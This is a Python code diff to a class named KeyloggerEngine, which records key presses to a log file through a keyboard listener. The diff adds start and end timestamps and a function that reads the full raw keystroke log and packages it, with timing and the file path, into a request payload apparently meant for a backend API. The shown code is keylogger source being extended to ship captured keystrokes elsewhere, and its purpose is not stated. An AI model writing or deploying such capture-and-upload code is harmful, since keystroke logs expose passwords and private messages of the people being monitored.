@@ -22,6 +22,8 @@ class KeyloggerEngine:
         self.buffer = ""
         self.line_buffer = []
         self.log_file = None
+        self.start_time = None
+        self.end_time = None
 
         self.listener = None
         self.last_window = None
@@ -233,6 +235,7 @@ class KeyloggerEngine:
         with open(self.log_file, "w", encoding="utf-8") as file_obj:
             file_obj.write(header)
 
+        self.start_time = datetime.now()
         self._set_running(True)
         self.listener = keyboard.Listener(on_press=self._on_press, on_release=self._on_release)
         self.listener.start()
@@ -247,6 +250,7 @@ class KeyloggerEngine:
             return
 
         self._set_running(False)
+        self.end_time = datetime.now()
 
         if self.listener:
             self.listener.stop()
@@ -276,3 +280,24 @@ class KeyloggerEngine:
             "top_keys": top_3,
             "running": self.is_running,
         }
+
+
+def build_keylogger_payload(engine) -> dict:
+    """Converte resultado do KeyloggerEngine para formato KeyloggerResultadoRequest."""
+    inicio = engine.start_time.strftime("%Y-%m-%dT%H:%M:%S") if engine.start_time else None
+    termino = engine.end_time.strftime("%Y-%m-%dT%H:%M:%S") if engine.end_time else None
+
+    texto_bruto = ""
+    if engine.log_file and os.path.exists(engine.log_file):
+        try:
+            with open(engine.log_file, "r", encoding="utf-8") as f:
+                texto_bruto = f.read()
+        except Exception:
+            texto_bruto = ""
+
+    return {
+        "inicio": inicio,
+        "termino": termino,
+        "urlArquivo": engine.log_file,
+        "textoBruto": texto_bruto,
+    }
